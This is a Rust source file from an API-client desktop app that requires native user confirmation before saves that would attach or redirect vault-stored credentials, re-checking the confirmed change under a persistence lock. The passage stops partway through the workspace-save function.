//! Native confirmation for persistence mutations that establish or alter a
//! vault-authority [`Binding`].
//!
//! `send_request`, `session_open` and `oauth_sign_in` check
//! [`crate::draft_authority`] when executing an unsaved draft (`spec: Some`),
//! and execute saved requests (`spec: None`) directly. Without gating
//! persistence mutations, a compromised renderer could create or edit a
//! saved request, workspace, folder, environment, TLS profile, proxy profile
//! or app defaults to attach or redirect vault credentials, or copy an
//! isolated imported request to workspace scope via `request_create`, and
//! then execute it with `spec: None`.
//!
//! Every persistence mutation checked here compares the workspace state
//! before and after the proposed write across every environment reachable by
//! each affected request. A save that neither establishes nor alters any
//! vault-backed authority binding proceeds without prompting. Any save that
//! does asks natively (`crate::presence::confirm`) and re-verifies the exact
//! confirmed binding delta under the desktop persistence lock and lock epoch
//! before committing.

use crate::commands::{R, e};
use crate::draft_authority::{Binding, Facts, ProxyBinding, TlsBinding, alone, carries_vault_authority, changes, names_a_secret};
use crate::presence::{Presence, Prompt, confirm, fenced, shown};
use crate::state::DesktopState;
use anvil_app::exec::refuse_linked_files;
use anvil_app::{App, AppError};
use anvil_domain::Id;
use anvil_domain::auth::AuthConfig;
use anvil_domain::integration::IntegrationProfile;
use anvil_domain::request::{Body, Protocol, RequestSpec};
use anvil_domain::secret::SensitiveValue;
use anvil_domain::settings::{AppSettings, LockPolicy, SettingsOverrides};
use anvil_domain::tls::{ProxyProfile, TlsProfile};
use anvil_domain::workspace::{Environment, Folder, RequestDefinition, Variable, Workspace};
use anvil_engine::context::{ExecutionContext, MemoryAttachments, MemorySecrets};
use anvil_engine::vars::{VarEntry, VarLayer};
use anvil_storage::{StoreError, kind};
use std::collections::{HashMap, HashSet};
use std::sync::Arc;

/// Returned when workspace state changed while a native confirmation dialog
/// was open so the save would now establish or alter a different binding.
pub(crate) const CHANGED_MEANWHILE: &str = "the workspace changed while you were asked; review and save again";

/// Maximum number of affected requests named individually in a scope-mutation
/// confirmation dialog.
const MAX_NAMED_REQUESTS: usize = 3;

async fn off<T: Send + 'static>(f: impl FnOnce() -> R<T> + Send + 'static) -> R<T> {
    tokio::task::spawn_blocking(f).await.map_err(|x| x.to_string())?
}

/// Which environment a context is evaluated under.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum EnvChoice {
    /// `workspace.active_environment_id` (what `SendOptions { environment: None }` uses).
    Active,
    /// No environment at all (baseline when creating a brand-new environment).
    None,
    /// Explicit `environment_id` passed by the caller (`SendOptions { environment: Some(id) }`).
    Explicit(Id),
}

/// Consistent in-memory snapshot of one workspace (and app defaults), used to
/// evaluate before/after contexts without writing to the store first.
#[derive(Clone)]
struct WorkspaceSnapshot {
    ws_id: Id,
    app_settings: AppSettings,
    workspace: Option<Workspace>,
    folders: Vec<Folder>,
    requests: Vec<RequestDefinition>,
    environments: Vec<Environment>,
    tls_profiles: Vec<TlsProfile>,
    proxy_profiles: Vec<ProxyProfile>,
    integrations: Vec<IntegrationProfile>,
    secrets: Arc<MemorySecrets>,
}

impl WorkspaceSnapshot {
    fn load(app: &App, ws_id: &Id) -> R<Self> {
        let ws = *ws_id;
        app.store
            .read_consistently(|r| {
                let app_settings: AppSettings = r.get(kind::APP_SETTINGS, &anvil_app::settings_id())?.unwrap_or_default();
                let workspace: Option<Workspace> = r.get(kind::WORKSPACE, &ws)?;
                let folders: Vec<Folder> = r.list(kind::FOLDER, Some(&ws))?;
                let mut requests: Vec<RequestDefinition> = r.list(kind::REQUEST, Some(&ws))?;
                requests.sort_by_key(|req| req.meta.id);
                let mut environments: Vec<Environment> = r.list(kind::ENVIRONMENT, Some(&ws))?;
                environments.sort_by_key(|env| env.meta.id);
                let tls_profiles: Vec<TlsProfile> = r.list(kind::TLS_PROFILE, Some(&ws))?;
                let proxy_profiles: Vec<ProxyProfile> = r.list(kind::PROXY_PROFILE, Some(&ws))?;
                let integrations: Vec<IntegrationProfile> = r.list(kind::INTEGRATION, Some(&ws))?;
                let ws_str = ws.to_string();
                let mut secret_map = HashMap::new();
                for rec in r.secrets()? {
                    if rec.workspace_id.as_deref() == Some(ws_str.as_str())
                        && let Ok(sid) = rec.id.parse::<Id>()
                    {
                        secret_map.insert(sid, rec.value);
                    }
                }
                Ok(WorkspaceSnapshot {
                    ws_id: ws,
                    app_settings,
                    workspace,
                    folders,
                    requests,
                    environments,
                    tls_profiles,
                    proxy_profiles,
                    integrations,
                    secrets: Arc::new(MemorySecrets(secret_map)),
                })
            })
            .map_err(|err| e(err.into()))
    }

    fn with_workspace(&self, ws: Workspace) -> Self {
        let mut next = self.clone();
        next.workspace = Some(ws);
        next
    }

    fn with_folder(&self, folder: Folder) -> Self {
        let mut next = self.clone();
        if let Some(existing) = next.folders.iter_mut().find(|f| f.meta.id == folder.meta.id) {
            *existing = folder;
        } else {
            next.folders.push(folder);
        }
        next
    }

    fn with_environment(&self, env: Environment) -> Self {
        let mut next = self.clone();
        if let Some(existing) = next.environments.iter_mut().find(|e| e.meta.id == env.meta.id) {
            *existing = env;
        } else {
            next.environments.push(env);
            next.environments.sort_by_key(|e| e.meta.id);
        }
        next
    }

    fn with_tls_profile(&self, profile: TlsProfile) -> Self {
        let mut next = self.clone();
        if let Some(existing) = next.tls_profiles.iter_mut().find(|p| p.id == profile.id) {
            *existing = profile;
        } else {
            next.tls_profiles.push(profile);
        }
        next
    }

    fn with_proxy_profile(&self, profile: ProxyProfile) -> Self {
        let mut next = self.clone();
        if let Some(existing) = next.proxy_profiles.iter_mut().find(|p| p.id == profile.id) {
            *existing = profile;
        } else {
            next.proxy_profiles.push(profile);
        }
        next
    }

    fn with_app_defaults(&self, defaults: SettingsOverrides) -> Self {
        let mut next = self.clone();
        next.app_settings.defaults = defaults;
        next
    }

    /// Root-to-leaf ancestor chain of `folder_id`, or `None` if broken/cyclic.
    fn folder_chain(&self, mut folder_id: Option<Id>) -> Option<Vec<&Folder>> {
        let mut chain = Vec::new();
        let mut seen = HashSet::new();
        while let Some(cur) = folder_id {
            if !seen.insert(cur) || chain.len() > 256 {
                return None;
            }
            let f = self.folders.iter().find(|f| f.meta.id == cur && f.workspace_id == self.ws_id)?;
            chain.push(f);
            folder_id = f.parent_id;
        }
        chain.reverse();
        Some(chain)
    }

    /// Whether `folder_id` sits inside `ancestor_id` (or equals it).
    fn has_ancestor(&self, folder_id: Option<Id>, ancestor_id: Id) -> bool {
        self.folder_chain(folder_id).is_some_and(|chain| chain.iter().any(|f| f.meta.id == ancestor_id))
    }

    /// Sealed import root governing `folder_id`, if any.
    fn sealed_root(&self, folder_id: Option<Id>) -> Option<&Folder> {
        let chain = self.folder_chain(folder_id)?;
        let root = chain.iter().rposition(|f| f.import_root)?;
        (!chain[root].use_workspace_scope).then_some(chain[root])
    }

    /// Whether `env_id` can be resolved by a request in `folder_id`.
    fn env_in_scope(&self, folder_id: Option<Id>, env_id: Id) -> bool {
        self.sealed_root(folder_id).is_none_or(|root| root.import_environment_ids.contains(&env_id))
    }

    /// Every environment choice under which a request in `folder_id` can be
    /// executed via `send_request` / `session_open` / `oauth_sign_in`: first
    /// the workspace's active environment (`EnvChoice::Active`), then every
    /// other in-scope environment in deterministic id order.
    fn reachable_envs(&self, folder_id: Option<Id>) -> Vec<(EnvChoice, Option<Id>, Option<String>)> {
        let Some(ws) = self.workspace.as_ref() else {
            return Vec::new();
        };
        let active_id = ws
            .active_environment_id
            .filter(|eid| self.environments.iter().any(|e| e.meta.id == *eid && e.workspace_id == self.ws_id))
            .filter(|eid| self.env_in_scope(folder_id, *eid));
        let active_name = active_id.and_then(|eid| self.environments.iter().find(|e| e.meta.id == eid).map(|e| e.name.clone()));
        let mut out = vec![(EnvChoice::Active, active_id, active_name)];
        for env in &self.environments {
            if Some(env.meta.id) == active_id {
                continue;
            }
            if self.env_in_scope(folder_id, env.meta.id) {
                out.push((EnvChoice::Explicit(env.meta.id), Some(env.meta.id), Some(env.name.clone())));
            }
        }
        out
    }

    /// Mirror of `App::build_context_in` against this in-memory snapshot.
    fn build_context(
        &self,
        req_id: Option<Id>,
        folder_id: Option<Id>,
        spec: &RequestSpec,
        env_choice: EnvChoice,
    ) -> Option<ExecutionContext> {
        let ws = self.workspace.as_ref()?;
        let chain = self.folder_chain(folder_id)?;
        let root = chain.iter().rposition(|f| f.import_root);
        let sealed = root.filter(|&i| !chain[i].use_workspace_scope);
        let inner = &chain[sealed.unwrap_or(0)..];

        let mut settings_layers =
            vec![("app".to_string(), self.app_settings.defaults.clone()), ("workspace".to_string(), ws.settings.clone())];
        for f in &chain {
            settings_layers.push((format!("folder:{}", f.name), f.settings.clone()));
        }
        settings_layers.push(("request".into(), spec.settings.clone()));

        let owned = |auth: &AuthConfig, owner: Option<Id>| {
            let mut auth = auth.clone();
            if let Some(owner) = owner {
                auth.bind_token_cache(owner);
            }
            auth
        };
        let mut auth_layers = Vec::new();
        if sealed.is_none() {
            auth_layers.push(("workspace".to_string(), owned(&ws.auth, Some(ws.meta.id))));
        }
        for f in inner {
            auth_layers.push((format!("folder:{}", f.name), owned(&f.auth, Some(f.meta.id))));
        }
        auth_layers.push(("request".into(), owned(&spec.auth, req_id)));

        let mut var_layers = Vec::new();
        let push_layer = |layers: &mut Vec<VarLayer>, label: String, vars: &[Variable]| {
            let mut out = Vec::new();
            for v in vars.iter().filter(|v| v.enabled) {
                let value = match &v.value {
                    SensitiveValue::Template { value } => value.clone(),
                    SensitiveValue::Secret { secret } => match self.secrets.0.get(&secret.id) {
                        Some(val) => (**val).clone(),
                        None => format!("\u{0}missing-secret:{}\u{0}", secret.id),
                    },
                };
                out.push(VarEntry {
                    name: v.name.clone(),
                    value,
                    secret: v.secret || matches!(v.value, SensitiveValue::Secret { .. }),
                    literal: false,
                });
            }
            layers.push(VarLayer { label, vars: out });
        };

        if sealed.is_none() {
            push_layer(&mut var_layers, "workspace".into(), &ws.variables);
        }
        let (base, nested) = inner.split_at(root.map_or(0, |i| i + 1) - sealed.unwrap_or(0));
        for f in base {
            push_layer(&mut var_layers, format!("folder:{}", f.name), &f.variables);
        }
        let selected_env = match env_choice {
            EnvChoice::Active => ws.active_environment_id,
            EnvChoice::None => None,
            EnvChoice::Explicit(id) => Some(id),
        };
        let env_id = selected_env
            .filter(|eid| self.environments.iter().any(|e| e.meta.id == *eid && e.workspace_id == self.ws_id))
            .filter(|eid| sealed.is_none_or(|i| chain[i].import_environment_ids.contains(eid)));
        if let Some(eid) = env_id
            && let Some(env) = self.environments.iter().find(|e| e.meta.id == eid)
        {
            push_layer(&mut var_layers, format!("environment:{}", env.name), &env.variables);
        }
        for f in nested {
            push_layer(&mut var_layers, format!("folder:{}", f.name), &f.variables);
        }

        Some(ExecutionContext {
            workspace_id: Some(self.ws_id),
            request_id: req_id,
            revision_id: None,
            environment_id: env_id,
            spec: spec.clone(),
            settings_layers,
            auth_layers,
            var_layers,
            tls_profiles: self.tls_profiles.clone(),
            proxy_profiles: self.proxy_profiles.clone(),
            integrations: self.integrations.clone(),
            secrets: self.secrets.clone(),
            attachments: Arc::new(MemoryAttachments::default()),
            isolation: self.ws_id.to_string(),
            send_anyway: false,
            seed: None,
            redaction_names: self.app_settings.redaction_names.clone(),
            scope: sealed.map(|i| chain[i].meta.id),
            epoch: None,
            notes: vec![],
        })
    }
}

/// Whether `spec` is an unsent blank placeholder (as created when clicking
/// "New request" in the UI, or `request_create` with `spec: None`) carrying
/// no URL host, no explicit auth, no settings overrides, no headers, no
/// secrets and no protocol tunnel. Such a request cannot send credentials
/// anywhere; adding a URL or auth later via `request_save` or a draft send
/// still requires confirmation.
fn is_blank_placeholder(spec: &RequestSpec) -> bool {
    let url = spec.url.trim();
    let blank_url = url.is_empty() || url.eq_ignore_ascii_case("https://");
    blank_url
        && spec.protocol == Protocol::Http
        && matches!(spec.auth, AuthConfig::Inherit | AuthConfig::None)
        && matches!(spec.body, Body::None)
        && spec.headers.is_empty()
        && spec.settings == SettingsOverrides::default()
        && spec.grpc.is_none()
        && spec.websocket.is_none()
        && spec.sse.is_none()
        && spec.tcp.is_none()
        && spec.udp.is_none()
        && spec.mcp.is_none()
        && spec.proxy_protocol.is_none()
        && serde_json::to_value(spec).is_ok_and(|v| !names_a_secret(&v))
}

fn has_oauth(auth: &AuthConfig) -> bool {
    !matches!(auth.oauth_profile(), Ok(None))
}

/// One `(workspace, request, environment)` binding change confirmed by the user.
#[derive(Debug, PartialEq, Eq)]
struct BindingDelta {
    ws_id: Id,
    req_id: Option<Id>,
    env_id: Option<Id>,
    before: Option<Binding>,
    after: Binding,
}

/// Exact set of binding changes confirmed by the user; re-checked under the
/// persistence lock before committing so a concurrent mutation cannot swap
/// what was confirmed.
#[derive(Debug, PartialEq, Eq)]
struct ConfirmFingerprint(Vec<BindingDelta>);

struct ConfirmPlan {
    prompt: Prompt,
    fingerprint: ConfirmFingerprint,
}

enum Step<T> {
    Done(T),
    NeedsConfirm(ConfirmPlan),
}

struct Affected {
    ws_id: Id,
    ws_name: String,
    req_id: Option<Id>,
    req_name: String,
    env_id: Option<Id>,
    env_name: Option<String>,
    before: Option<(Binding, Facts)>,
    after: (Binding, Facts),
}

impl Affected {
    fn key(&self) -> BindingDelta {
        BindingDelta {
            ws_id: self.ws_id,
            req_id: self.req_id,
            env_id: self.env_id,
            before: self.before.as_ref().map(|(b, _)| b.clone()),
            after: self.after.0.clone(),
        }
    }
}

fn build_request_create_plan(ws_name: &str, req_name: &str, affected: Vec<Affected>) -> Option<ConfirmPlan> {
    let first = affected.first()?;
    let mut lines = alone(&first.after.0, &first.after.1);
    if let Some(env_name) = &first.env_name {
        lines.push(format!("Environment: “{}”", shown(env_name)));
    }
    if affected.len() > 1 {
        lines.push(format!("Applies across {} environments in this workspace", affected.len()));
    }
    let message = format!(
        "Destination: {}\n\nSaving the new request “{}” would use credentials or secret values from the workspace “{}”:\n• {}\n\nOnly continue if you made this request yourself.",
        first.after.1.destination,
        shown(req_name),
        shown(ws_name),
        lines.join("\n• "),
    );
    let fingerprint = ConfirmFingerprint(affected.iter().map(Affected::key).collect());
    Some(ConfirmPlan { prompt: Prompt { title: "Save request with workspace credentials?", message, ok: "Save request" }, fingerprint })
}

fn build_request_save_plan(ws_name: &str, req_name: &str, affected: Vec<Affected>) -> Option<ConfirmPlan> {
    let first = affected.first()?;
    let (lead, mut lines) = match &first.before {
        Some((before_b, before_f)) => (
            format!(
                "Saving changes to the request “{}” would use credentials or secret values from the workspace “{}” differently:",
                shown(req_name),
                shown(ws_name)
            ),
            changes(&first.after.0, &first.after.1, before_b, before_f),
        ),
        None => (
            format!(
                "Saving changes to the request “{}” would use credentials or secret values from the workspace “{}”:",
                shown(req_name),
                shown(ws_name)
            ),
            alone(&first.after.0, &first.after.1),
        ),
    };
    if let Some(env_name) = &first.env_name {
        lines.push(format!("Environment: “{}”", shown(env_name)));
    }
    if affected.len() > 1 {
        lines.push(format!("Affects {} environment contexts in this workspace", affected.len()));
    }
    let message = format!(
        "Destination: {}\n\n{lead}\n• {}\n\nOnly continue if you made these changes yourself.",
        first.after.1.destination,
        lines.join("\n• "),
    );
    let fingerprint = ConfirmFingerprint(affected.iter().map(Affected::key).collect());
    Some(ConfirmPlan { prompt: Prompt { title: "Save changes using workspace credentials?", message, ok: "Save changes" }, fingerprint })
}

fn build_scope_plan(title: &'static str, subject: String, affected: Vec<Affected>) -> Option<ConfirmPlan> {
    let first = affected.first()?;
    let mut lines = match &first.before {
        Some((before_b, before_f)) => changes(&first.after.0, &first.after.1, before_b, before_f),
        None => alone(&first.after.0, &first.after.1),
    };
    let mut seen_requests = HashSet::new();
    let mut named_requests = Vec::new();
    for item in &affected {
        if seen_requests.insert((item.ws_id, item.req_id)) {
            named_requests.push(format!("“{}” ({})", shown(&item.req_name), item.after.1.destination));
        }
    }
    if named_requests.len() == 1 {
        lines.insert(0, format!("Affected request: {}", named_requests[0]));
    } else {
        let shown_list: Vec<_> = named_requests.iter().take(MAX_NAMED_REQUESTS).cloned().collect();
        let extra = named_requests.len().saturating_sub(MAX_NAMED_REQUESTS);
        let summary = if extra > 0 { format!("{}; and {extra} more", shown_list.join("; ")) } else { shown_list.join("; ") };
        lines.insert(0, format!("Affected requests ({}): {summary}", named_requests.len()));
    }
    if let Some(env_name) = &first.env_name {
        lines.push(format!("Environment: “{}”", shown(env_name)));
    }
    let message = format!(
        "Destination: {}\n\n{subject} would use credentials or secret values from the workspace “{}” differently:\n• {}\n\nOnly continue if you made these changes yourself.",
        first.after.1.destination,
        shown(&first.ws_name),
        lines.join("\n• "),
    );
    let fingerprint = ConfirmFingerprint(affected.iter().map(Affected::key).collect());
    Some(ConfirmPlan { prompt: Prompt { title, message, ok: "Save changes" }, fingerprint })
}

fn plan_request_create(snap: &WorkspaceSnapshot, folder: Option<Id>, name: &str, spec: &RequestSpec) -> Option<ConfirmPlan> {
    if is_blank_placeholder(spec) {
        return None;
    }
    let ws = snap.workspace.as_ref()?;
    let mut affected = Vec::new();
    for (choice, env_id, env_name) in snap.reachable_envs(folder) {
        let Some(ctx) = snap.build_context(None, folder, spec, choice) else {
            continue;
        };
        if !carries_vault_authority(&ctx) {
            continue;
        }
        affected.push(Affected {
            ws_id: snap.ws_id,
            ws_name: ws.name.clone(),
            req_id: None,
            req_name: name.to_string(),
            env_id,
            env_name,
            before: None,
            after: (Binding::of(&ctx), Facts::of(&ctx)),
        });
    }
    build_request_create_plan(&ws.name, name, affected)
}

fn plan_request_save(snap: &WorkspaceSnapshot, stored: &RequestDefinition, updated: &RequestDefinition) -> Option<ConfirmPlan> {
    if stored.spec == updated.spec {
        return None;
    }
    let ws = snap.workspace.as_ref()?;
    let mut affected = Vec::new();
    for (choice, env_id, env_name) in snap.reachable_envs(stored.folder_id) {
        let Some(after_ctx) = snap.build_context(Some(stored.meta.id), stored.folder_id, &updated.spec, choice) else {
            continue;
        };
        if !carries_vault_authority(&after_ctx) {
            continue;
        }
        let after_binding = Binding::of(&after_ctx);
        let before_ctx = snap.build_context(Some(stored.meta.id), stored.folder_id, &stored.spec, choice);
        let before = before_ctx.as_ref().filter(|c| carries_vault_authority(c)).map(|c| (Binding::of(c), Facts::of(c)));
        if before.as_ref().is_some_and(|(b, _)| after_binding.matches(b)) {
            continue;
        }
        affected.push(Affected {
            ws_id: snap.ws_id,
            ws_name: ws.name.clone(),
            req_id: Some(stored.meta.id),
            req_name: updated.name.clone(),
            env_id,
            env_name,
            before,
            after: (after_binding, Facts::of(&after_ctx)),
        });
    }
    build_request_save_plan(&ws.name, &updated.name, affected)
}

fn collect_scope_affected(
    before_snap: &WorkspaceSnapshot,
    after_snap: &WorkspaceSnapshot,
    mut include_request: impl FnMut(&RequestDefinition) -> bool,
    mut include_context: impl FnMut(&ExecutionContext) -> bool,
) -> Vec<Affected> {
    let Some(ws) = after_snap.workspace.as_ref() else {
        return Vec::new();
    };
    let mut affected = Vec::new();
    for req in &before_snap.requests {
        if !include_request(req) {
            continue;
        }
        for (choice, env_id, env_name) in after_snap.reachable_envs(req.folder_id) {
            let Some(after_ctx) = after_snap.build_context(Some(req.meta.id), req.folder_id, &req.spec, choice) else {
                continue;
            };
            if !include_context(&after_ctx) {
                continue;
            }
            if !carries_vault_authority(&after_ctx) {
                continue;
            }
            if is_blank_placeholder(&req.spec) && !has_oauth(&after_ctx.effective_auth().1) {
                continue;
            }
            let after_binding = Binding::of(&after_ctx);
            let before_ctx = before_snap.build_context(Some(req.meta.id), req.folder_id, &req.spec, choice);
            let before = before_ctx.as_ref().filter(|c| carries_vault_authority(c)).map(|c| (Binding::of(c), Facts::of(c)));
            if before.as_ref().is_some_and(|(b, _)| after_binding.matches_under_scope_mutation(b)) {
                continue;
            }
            affected.push(Affected {
                ws_id: after_snap.ws_id,
                ws_name: ws.name.clone(),
                req_id: Some(req.meta.id),
                req_name: req.name.clone(),
                env_id,
                env_name,
                before,
                after: (after_binding, Facts::of(&after_ctx)),
            });
        }
    }
    affected
}

fn plan_workspace_save(before_snap: &WorkspaceSnapshot, workspace: &Workspace) -> Option<ConfirmPlan> {
    if let Some(stored) = &before_snap.workspace
        && stored.settings == workspace.settings
        && stored.variables == workspace.variables
        && stored.auth == workspace.auth
        && stored.active_environment_id == workspace.active_environment_id
    {
        return None;
    }
    let after_snap = before_snap.with_workspace(workspace.clone());
    let affected = collect_scope_affected(before_snap, &after_snap, |_| true, |_| true);
    let subject = format!("Saving changes to the workspace “{}”", shown(&workspace.name));
    build_scope_plan("Save workspace changes?", subject, affected)
}

fn normalize_folder_in_place(stored: Option<&Folder>, mut folder: Folder) -> Folder {
    if let Some(stored) = stored {
        folder.parent_id = stored.parent_id;
        folder.import_root = stored.import_root;
        folder.import_environment_ids = stored.import_environment_ids.clone();
        folder.use_workspace_scope = stored.use_workspace_scope;
    } else {
        folder.import_root = false;
        folder.import_environment_ids.clear();
        folder.use_workspace_scope = false;
    }
    folder
}

fn plan_folder_save(before_snap: &WorkspaceSnapshot, stored: Option<&Folder>, folder: &Folder) -> Option<ConfirmPlan> {
    let effective = normalize_folder_in_place(stored, folder.clone());
    if let Some(stored) = stored
        && stored.settings == effective.settings
        && stored.variables == effective.variables
        && stored.auth == effective.auth
    {
        return None;
    }
    let fid = effective.meta.id;
    let after_snap = before_snap.with_folder(effective.clone());
    let affected = collect_scope_affected(before_snap, &after_snap, |req| before_snap.has_ancestor(req.folder_id, fid), |_| true);
    let subject = format!("Saving changes to the folder “{}”", shown(&effective.name));
    build_scope_plan("Save folder changes?", subject, affected)
}

fn plan_environment_save(before_snap: &WorkspaceSnapshot, stored: Option<&Environment>, environment: &Environment) -> Option<ConfirmPlan> {
    match stored {
        Some(prev) if prev.variables == environment.variables => return None,
        None if environment.variables.iter().all(|v| !v.enabled) => return None,
        _ => {}
    }
    let Some(ws) = before_snap.workspace.as_ref() else {
        return None;
    };
    let after_snap = before_snap.with_environment(environment.clone());
    let env_id = environment.meta.id;
    let before_choice = if stored.is_some() { EnvChoice::Explicit(env_id) } else { EnvChoice::None };
    let mut affected = Vec::new();
    for req in &before_snap.requests {
        if !before_snap.env_in_scope(req.folder_id, env_id) {
            continue;
        }
        let Some(after_ctx) = after_snap.build_context(Some(req.meta.id), req.folder_id, &req.spec, EnvChoice::Explicit(env_id)) else {
            continue;
        };
        if !carries_vault_authority(&after_ctx) {
            continue;
        }
        if is_blank_placeholder(&req.spec) && !has_oauth(&after_ctx.effective_auth().1) {
            continue;
        }
        let after_binding = Binding::of(&after_ctx);
        let before_ctx = before_snap.build_context(Some(req.meta.id), req.folder_id, &req.spec, before_choice);
        let before = before_ctx.as_ref().filter(|c| carries_vault_authority(c)).map(|c| (Binding::of(c), Facts::of(c)));
        if before.as_ref().is_some_and(|(b, _)| after_binding.matches_under_scope_mutation(b)) {
            continue;
        }
        affected.push(Affected {
            ws_id: before_snap.ws_id,
            ws_name: ws.name.clone(),
            req_id: Some(req.meta.id),
            req_name: req.name.clone(),
            env_id: Some(env_id),
            env_name: Some(environment.name.clone()),
            before,
            after: (after_binding, Facts::of(&after_ctx)),
        });
    }
    let subject = format!("Saving changes to the environment “{}”", shown(&environment.name));
    build_scope_plan("Save environment changes?", subject, affected)
}

fn context_selects_tls(ctx: &ExecutionContext, tls_id: Id) -> bool {
    let settings = anvil_engine::settings::resolve(&ctx.settings_layers);
    if settings.tls_profile_id == Some(tls_id) {
        return true;
    }
    settings
        .proxy_profile_id
        .and_then(|pid| ctx.proxy_profiles.iter().find(|p| p.id == pid))
        .is_some_and(|proxy| proxy.tls_profile_id == Some(tls_id))
}

fn context_selects_proxy(ctx: &ExecutionContext, proxy_id: Id) -> bool {
    anvil_engine::settings::resolve(&ctx.settings_layers).proxy_profile_id == Some(proxy_id)
}

fn plan_tls_profile_save(before_snap: &WorkspaceSnapshot, stored: Option<&TlsProfile>, profile: &TlsProfile) -> Option<ConfirmPlan> {
    if let Some(prev) = stored
        && TlsBinding::of(prev) == TlsBinding::of(profile)
    {
        return None;
    }
    let tid = profile.id;
    let after_snap = before_snap.with_tls_profile(profile.clone());
    let affected = collect_scope_affected(before_snap, &after_snap, |_| true, |ctx| context_selects_tls(ctx, tid));
    let subject = format!("Saving changes to the TLS profile “{}”", shown(&profile.name));
    build_scope_plan("Save TLS profile changes?", subject, affected)
}

fn plan_proxy_profile_save(before_snap: &WorkspaceSnapshot, stored: Option<&ProxyProfile>, profile: &ProxyProfile) -> Option<ConfirmPlan> {
    if let Some(prev) = stored
        && ProxyBinding::of(prev) == ProxyBinding::of(profile)
    {
        return None;
    }
    let pid = profile.id;
    let after_snap = before_snap.with_proxy_profile(profile.clone());
    let affected = collect_scope_affected(before_snap, &after_snap, |_| true, |ctx| context_selects_proxy(ctx, pid));
    let subject = format!("Saving changes to the proxy profile “{}”", shown(&profile.name));
    build_scope_plan("Save proxy profile changes?", subject, affected)
}

fn plan_app_defaults_save(app: &App, defaults: &SettingsOverrides) -> R<Option<ConfirmPlan>> {
    let mut workspaces = app.workspaces().map_err(e)?;
    workspaces.sort_by_key(|w| w.meta.id);
    let mut affected = Vec::new();
    for ws in workspaces {
        let before_snap = WorkspaceSnapshot::load(app, &ws.meta.id)?;
        let after_snap = before_snap.with_app_defaults(defaults.clone());
        affected.extend(collect_scope_affected(&before_snap, &after_snap, |_| true, |_| true));
    }
    let subject = format!("Saving default connection settings for the profile “{}”", shown(&app.header.display_name));
    Ok(build_scope_plan("Save default connection settings?", subject, affected))
}

fn validate_request_create_target(app: &App, snap: &WorkspaceSnapshot, folder: Option<Id>) -> R<()> {
    if snap.workspace.is_none() {
        return Err(e(AppError::NotFound("workspace".into())));
    }
    if let Some(fid) = folder
        && !snap.folders.iter().any(|f| f.meta.id == fid)
    {
        let existing: Option<Folder> = app.store.get(kind::FOLDER, &fid).map_err(|err| e(err.into()))?;
        return match existing {
            Some(_) => Err(e(AppError::Invalid("folder belongs to another workspace".into()))),
            None => Err(e(AppError::NotFound("folder".into()))),
        };
    }
    Ok(())
}

/// Create a request in `ws` (optionally in `folder`). Requires native
/// confirmation when the new request carries vault-backed authority (including
/// when created outside an isolated import root where it gains workspace-scope
/// authority). Blank placeholder requests and non-vault requests do not prompt.
pub(crate) async fn create_request(
    st: &DesktopState,
    presence: &impl Presence,
    ws: Id,
    folder: Option<Id>,
    name: String,
    spec: RequestSpec,
) -> R<RequestDefinition> {
    let seen = st.epoch();
    let app = st.app()?;
    refuse_linked_files(&spec).map_err(e)?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let name_check = name.clone();
    let spec_check = spec.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let snap = WorkspaceSnapshot::load(&app_check, &ws)?;
        validate_request_create_target(&app_check, &snap, folder)?;
        if let Some(plan) = plan_request_create(&snap, folder, &name_check, &spec_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let created = app_check.create_request(&ws, folder, &name_check, spec_check).map_err(e)?;
        Ok(Step::Done(created))
    })
    .await?;

    let plan = match step {
        Step::Done(created) => return Ok(created),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let snap = WorkspaceSnapshot::load(&app, &ws)?;
        validate_request_create_target(&app, &snap, folder)?;
        if let Some(again) = plan_request_create(&snap, folder, &name, &spec)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.create_request(&ws, folder, &name, spec).map_err(e)
    })
    .await
}

/// Save a stored request. Requires native confirmation when the save
/// establishes vault-backed authority or alters its vault-authority [`Binding`].
pub(crate) async fn save_request(st: &DesktopState, presence: &impl Presence, request: RequestDefinition) -> R<RequestDefinition> {
    let seen = st.epoch();
    let app = st.app()?;
    refuse_linked_files(&request.spec).map_err(e)?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let req_check = request.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let Some(stored) = app_check.store.get::<RequestDefinition>(kind::REQUEST, &req_check.meta.id).map_err(|err| e(err.into()))? else {
            return Err(e(AppError::NotFound("request (it was deleted)".into())));
        };
        if req_check.workspace_id != stored.workspace_id {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        if req_check.spec != stored.spec {
            let snap = WorkspaceSnapshot::load(&app_check, &stored.workspace_id)?;
            if let Some(plan) = plan_request_save(&snap, &stored, &req_check) {
                return Ok(Step::NeedsConfirm(plan));
            }
        }
        let saved = app_check.save_request(req_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let Some(stored) = app.store.get::<RequestDefinition>(kind::REQUEST, &request.meta.id).map_err(|err| e(err.into()))? else {
            return Err(e(AppError::NotFound("request (it was deleted)".into())));
        };
        if request.workspace_id != stored.workspace_id {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app, &stored.workspace_id)?;
        if let Some(again) = plan_request_save(&snap, &stored, &request)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_request(request).map_err(e)
    })
    .await
}

/// Save a workspace. Requires native confirmation when the save establishes
/// or alters any saved request's vault-authority [`Binding`].
pub(crate) async fn save_workspace(st: &DesktopState, presence: &impl Presence, workspace: Workspace) -> R<Workspace> {
    let seen = st.epoch();
    let app = st.app()?;

    let persistence = st.persistence.clone();
